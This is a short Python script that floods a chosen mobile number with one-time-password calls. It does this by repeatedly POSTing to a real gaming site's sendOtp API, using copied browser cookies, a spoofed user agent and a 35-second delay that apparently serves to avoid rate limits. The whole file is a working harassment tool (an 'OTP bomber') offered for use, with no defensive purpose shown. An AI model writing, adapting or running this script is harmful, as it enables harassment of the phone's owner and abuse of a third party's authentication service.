import requests
import time

def send_otp_request(mobile_number, repeat_times):
    url = "https://www.rummycircle.com/api/fl/account/v1/sendOtp"
    headers = {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.6422.112 Safari/537.36",
        "Cookie": "sameSiteNoneSupported=true; LONG_VISITOR=d23d6645-9216-41a4-8ad0-64b25b41a538; device.info.cookie={\"bv\":\"125.0.6422.112\",\"bn\":\"Chrome\",\"osv\":\"10\",\"osn\":\"Windows\",\"tbl\":\"false\",\"vnd\":\"false\",\"mdl\":\"false\"}; SSID=SSIDbb43cc47-34a2-4c89-a852-dbeb05fdf3fd; SSIDuser=SSIDbb43cc47-34a2-4c89-a852-dbeb05fdf3fd%3A0; ga24x7_jsessionid=\"SSIDbb43cc47-34a2-4c89-a852-dbeb05fdf3fd:null\"; ga24x7_pixeltracker=from_page%3Dindex.html%26referrer_url%3Dhttps%253A%252F%252Fwww.google.com%252F; com.lpCookie=%7B%22132%22%3A%22index-south.html%22%7D; __utma=3588915.1039087899.1718734226.1718734226.1718734226.1; __utmc=3588915; __utmz=3588915.1718734226.1.1.utmcsr=google|utmccn=(organic)|utmcmd=organic|utmctr=(not%20provided); __utmb=3588915.1.10.1718734226; NA_IDVISIT=a70c9d51-f505-4303-b190-d00e49d0448c; NA_VISITOR=a70c9d51-f505-4303-b190-d00e49d0448c; AWSALB=S30ZjulkOFeQ2+L/ZCnRCHAf/KZLtqwuSX+8F35Uu2ebGukq/ooHFduQkB4ZWWU0inwmrUhuxovrmfaS5NM/KUoMRNvn0vemII2QZLfWahJQKaONFq/d0oR4dxkW; AWSALBCORS=S30ZjulkOFeQ2+L/ZCnRCHAf/KZLtqwuSX+8F35Uu2ebGukq/ooHFduQkB4ZWWU0inwmrUhuxovrmfaS5NM/KUoMRNvn0vemII2QZLfWahJQKaONFq/d0oR4dxkW"
    }
    data = {
        "otpOnCall": True,
        "otpType": 8,
        "mobile": mobile_number
    }
    
    for _ in range(repeat_times):
        try:
            response = requests.post(url, headers=headers, json=data)
            if response.status_code == 200:
                print(f"Success for mobile number: {mobile_number}")
            else:
                print(f"Failed for mobile number: {mobile_number}")
        except requests.exceptions.RequestException as e:
            print(f"Error occurred: {e}")
        
        time.sleep(35)  # Wait for 35 seconds between each call

def main():
    mobile_number = input("Enter the mobile number: ")
    repeat_times = int(input("Enter the number of times to repeat the request: "))
    send_otp_request(mobile_number, repeat_times)

if __name__ == "__main__":
    main()
